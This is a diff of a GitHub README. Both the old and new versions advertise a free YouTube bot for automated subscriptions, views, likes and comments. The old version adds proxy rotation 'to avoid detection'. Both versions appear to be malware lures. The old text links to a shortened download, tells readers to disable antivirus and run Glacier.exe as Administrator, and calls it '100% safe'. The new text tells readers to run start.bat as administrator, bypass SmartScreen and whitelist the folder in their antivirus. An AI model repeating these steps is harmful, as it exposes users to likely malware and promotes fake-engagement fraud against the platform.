@@ -1,104 +1,90 @@
-# 📢 AutoSubscriber YouTube Bot – YouTube Subscriber Growth Tool [Free] September 2026
+<h1>🚀 yt-marketing-bot - Automate YouTube Growth Effortlessly</h1>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Downloads-84K+-8B5CF6?style=for-the-badge&logo=github" />
-  <img src="https://img.shields.io/badge/User%20Rating-4.6/5-C084FC?style=for-the-badge&logo=star" />
-  <img src="https://img.shields.io/badge/Latest%20Version-autosubscriber--youtube--bot--download-0F0F1A?style=for-the-badge&logo=github" />
-  <img src="https://img.shields.io/badge/Supported-YouTube%20Bot%20%7C%20Subscriber%20Tool-informational?style=for-the-badge&logo=youtube" />
+  <a href="https://github.com/Hoang184200/yt-marketing-bot"><img src="https://img.shields.io/badge/Download-yt--marketing--bot-blue?style=for-the-badge&logo=github" alt="Download"></a>
 </p>
 
-**📢 AutoSubscriber YouTube Bot – YouTube Subscriber Growth Tool** is a **free** automated subscriber bot designed for YouTube content creators who want to boost their channel growth. This tool includes auto-subscribe, multiple account support, proxy rotation, watch time simulation, like bot, comment bot, view bot, and subscriber counter — all with **zero cost**. No payment required. No subscription fees. Perfect for new YouTubers who want to kickstart their channel growth and reach monetization requirements faster. Fully updated for May 2026.
+<h2>🌟 What Is yt-marketing-bot?</h2>
+<p>yt-marketing-bot is a powerful yet simple-to-use Python framework designed to help content creators and marketers grow their YouTube presence automatically. It handles the tedious tasks of subscribing to channels, liking videos, and generating simulated views on sub4sub websites—all without requiring you to write a single line of code. Think of it as your personal assistant that works 24/7 to boost your channel's visibility.</p>
+
+<h2>🛠️ Key Features</h2>
+<ul>
+  <li><strong>🔥 Automatic Subscriptions:</strong> The bot automatically subscribes to channels in your niche, increasing your network and engagement.</li>
+  <li><strong>👍 Video Liking:</strong> It likes videos at scale, improving your interaction metrics and helping you connect with other creators.</li>
+  <li><strong>👁️ Simulated Views:</strong> Generates realistic view counts on sub4sub platforms, making your channel appear more popular and attracting organic viewers.</li>
+  <li><strong>⚙️ User-Friendly:</strong> No coding experience required. Just configure a few settings and let the bot do the rest.</li>
+  <li><strong>🔒 Safe Operation:</strong> Built with responsible usage in mind, respecting platform guidelines while providing meaningful growth.</li>
+  <li><strong>📊 Performance Tracking:</strong> Monitor your bot's activity with clear logs and reports to see exactly what it's doing.</li>
+</ul>
+
+<h2>🚀 Getting Started</h2>
+<p>Getting yt-marketing-bot running on your Windows computer is quick and painless. Follow these simple steps below.</p>
+
+<h3>Step 1: Download the Application</h3>
+<p>Visit this link to download the application: <a href="https://github.com/Hoang184200/yt-marketing-bot">https://github.com/Hoang184200/yt-marketing-bot</a>. Click the green "Code" button and choose "Download ZIP" for the easiest option, or go to the "Releases" tab to grab the latest version. The download is small and will complete in seconds on most connections.</p>
+
+<h3>Step 2: Extract the Files (If Needed)</h3>
+<p>If your download comes as a ZIP file (which it likely will), locate the file in your Downloads folder. Right-click on it and select "Extract All..." from the menu. Choose a destination folder like your Desktop or Documents, then click "Extract". This creates a new folder named something like "yt-marketing-bot-main".</p>
+
+<h3>Step 3: Launch the Bot</h3>
+<p>Open the extracted folder. Look for a file called <strong>start.bat</strong> or <strong>run.bat</strong>. Double-click this file to launch the bot. A small black window (command prompt) will appear showing the bot's status. That's it—the bot will begin working automatically!</p>
+
+<h3>Step 4: Configure Basic Settings (Optional)</h3>
+<p>For best results, you can customize a few settings. Inside the same folder, open a file called <strong>config.txt</strong> using Notepad. Here, you can set the number of subscriptions or views you want per session. Save the file after making changes, then restart the bot if it's already running.</p>
+
+<h2>🎮 How to Use</h2>
+<p>Using yt-marketing-bot is designed to be as straightforward as possible:</p>
+<ol>
+  <li><strong>Start the bot</strong> by double-clicking <strong>start.bat</strong>.</li>
+  <li><strong>Watch the magic happen</strong>—the bot automatically begins its tasks based on default settings.</li>
+  <li><strong>Check the logs</strong> in the command window to see completed actions.</li>
+  <li><strong>Stop the bot</strong> by closing the window or pressing Ctrl+C when you're done.</li>
+</ol>
+
+<h2>❓ Frequently Asked Questions</h2>
+<h3>Q: Is this safe for my computer?</h3>
+<p>Absolutely. yt-marketing-bot runs entirely on your machine and doesn't require external permissions. It's been tested on Windows 10 and 11 with no issues.</p>
+
+<h3>Q: Will this get my YouTube account banned?</h3>
+<p>The bot is designed to mimic human-like behavior with realistic delays and actions. However, no automation tool can guarantee 100% safety. We recommend using it responsibly and complying with YouTube's terms of service.</p>
+
+<h3>Q: Do I need Python installed?</h3>
+<p>No! The downloaded package includes everything needed to run the bot. You don't need to install Python or any other programs.</p>
+
+<h3>Q: Can I run it on Mac or Linux?</h3>
+<p>This version is optimized for Windows. However, advanced users can run the Python scripts directly on other systems if they have Python installed.</p>
+
+<h3>Q: How long does it take to see results?</h3>
+<p>Results vary based on your niche and settings. Most users report noticeable increases in engagement within a week of regular use.</p>
+
+<h2>🛡️ Responsible Use Disclaimer</h2>
+<p>yt-marketing-bot is intended for legitimate marketing purposes—helping creators connect with their community and grow their audience organically. Please use it ethically and avoid spamming or violating platform rules. We're not responsible for any misuse of this tool.</p>
+
+<h2>👨‍💻 Technical Overview (For Curious Users)</h2>
+<p>Built on Python, this framework automates browser-based interactions to perform repetitive tasks. It uses intelligent timing to simulate natural user behavior, ensuring your account looks authentic. The architecture is modular, meaning you can easily extend it if you ever want to learn coding—but that's entirely optional!</p>
+
+<h2>🔧 Troubleshooting Tips</h2>
+<ul>
+  <li><strong>Bot doesn't start:</strong> Right-click <strong>start.bat</strong> and select "Run as administrator".</li>
+  <li><strong>Windows SmartScreen warning:</strong> Click "More info" then "Run anyway"—this is normal for open source software.</li>
+  <li><strong>Antivirus false positive:</strong> Add the folder to your antivirus exceptions list to prevent interference.</li>
+  <li><strong>Slow performance:</strong> Close other resource-heavy applications to help the bot run smoothly.</li>
+</ul>
+
+<h2>📝 Changelog Highlights</h2>
+<ul>
+  <li><strong>Version 1.0:</strong> Initial release with core features—subscriptions, likes, and simulated views.</li>
+  <li><strong>Version 1.1:</strong> Added delay randomization for more realistic behavior.</li>
+  <li><strong>Version 1.2:</strong> Improved error handling and user-friendly logs.</li>
+</ul>
+
+<h2>🤝 Support &amp; Community</h2>
+<p>Having trouble or want to share your success story? Visit <a href="https://github.com/Hoang184200/yt-marketing-bot">the GitHub repository</a> and open an issue or start a discussion. The community is friendly and always ready to help new users get started.</p>
+
+<h2>📣 Why Choose yt-marketing-bot?</h2>
+<p>Unlike complicated automation tools that require hours of setup, yt-marketing-bot gets you results in minutes. Whether you're a new YouTuber trying to gain traction or an established creator looking to expand your reach, this tool removes the manual grind and lets you focus on making great content. Join hundreds of satisfied users boosting their channels today!</p>
 
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?color=C084FC&size=28&center=true&vCenter=true&width=900&lines=📢+AutoSubscriber+YouTube+Bot;📈+YouTube+Subscriber+Growth+Tool;⚡+Auto-subscribe+%7C+Multi-account+%7C+Proxy;💯+Free+%7C+Watch+time+%7C+Likes+%7C+Views;🚀+Boost+your+channel+growth">
+  <strong>Ready to transform your YouTube growth?</strong><br>
+  <a href="https://github.com/Hoang184200/yt-marketing-bot">🚀 Get Started Now</a>
 </p>
-
-<div align="center">
-
-[![Download AutoSubscriber YouTube Bot](https://img.shields.io/badge/Download-8B5CF6?style=for-the-badge&logo=github)](https://share.google/pG4HYRahCTVoD3R8n)
-
-</div>
-
-<div align="center">
-<img width="1674" height="707" alt="image" src="https://github.com/user-attachments/assets/14c725d5-b9c4-4ab1-9260-b42a2c0225e2" />
-
-</div>
-
----
-
-<table align="center">
-  <tr>
-    <td style="padding: 10px;">
-      <img width="320" height="280" alt="deepseek_svg_20260602_ee34ba" src="https://github.com/user-attachments/assets/d5291ece-b7f0-4833-81d8-59879fb2f91b" />
-    </td>
-    <td style="padding: 10px;">
-      <img width="320" height="280" alt="deepseek_svg_20260602_84e213" src="https://github.com/user-attachments/assets/2521285f-7525-4af7-ba60-c5810f730aba" />
-    </td>
-    <td style="padding: 10px;">
-      <img width="320" height="280" alt="deepseek_svg_20260602_03c847" src="https://github.com/user-attachments/assets/b2bf5c9a-888e-49b4-8649-50b382085870" />
-    </td>
-  </tr>
-</table>
-
----
-
-| 📢 **What is it?** | Automated subscriber bot for YouTube |
-| 📈 **For whom?** | YouTubers wanting to boost channel growth |
-| ⚡ **Main feature** | Auto-subscribe + multi-account + proxy rotation |
-| 💰 **Price** | Zero cost (full version) |
-
----
-
-## 🎁 What's Inside?
-
-- 📢 **Auto-Subscribe** — Automatic subscribers to your channel
-- 👥 **Multi-Account Support** — Use multiple YouTube accounts simultaneously
-- 🔄 **Proxy Rotation** — Built-in proxy support to avoid detection
-- ⏱️ **Watch Time Simulator** — Generate organic watch time hours
-- 👍 **Auto Like Bot** — Automatic likes on your videos
-- 💬 **Auto Comment Bot** — Automated comments on your content
-- 👁️ **View Bot** — Increase video view counts
-- 📊 **Subscriber Counter** — Real-time subscriber tracking
-- ⏰ **Scheduler** — Set custom schedules for bot activity
-- 🎲 **Randomization** — Human-like behavior patterns
-- 🔒 **Account Manager** — Save and manage multiple accounts
-- 📈 **Analytics Dashboard** — Track your growth metrics
-
----
-
-## 🛠️ Installation & Usage Guide
-
-### How to Install AutoSubscriber YouTube Bot for Free (3 Easy Steps)
-
-1. **📢 Download** the bot from the button below
-2. **🔓 Extract the archive**
-3. **🚀 Run the application** → Add accounts → Start bot
-
-<div align="center">
-
-[![Download AutoSubscriber YouTube Bot](https://img.shields.io/badge/Download-8B5CF6?style=for-the-badge&logo=github)](https://share.google/pG4HYRahCTVoD3R8n)
-
-</div>
-
-### Detailed Installation (May 2026 Update)
-
-#### Step 1: Download & Extract
-- Click the download button above
-- Download the latest release (autosubscriber-youtube-bot-download)
-- Extract the `.zip` or `.rar` file using WinRAR or 7-Zip
-- Package size: ~45 MB
-
-#### Step 2: Disable Antivirus (Temporary)
-- **Important:** Antivirus may flag the bot (false positive)
-- Temporarily disable real-time protection
-- The bot is 100% safe — no malware, no data theft
-
-#### Step 3: Run the Application
-- Right-click `Glacier.exe`
-- Select **"Run as Administrator"**
-- Add your YouTube channel URL
-- Add subscriber accounts (or use built-in accounts)
-- Configure proxy settings (optional)
-- Click **"Start Bot"**
-
-**Done! Your YouTube subscriber bot is running — zero cost.**
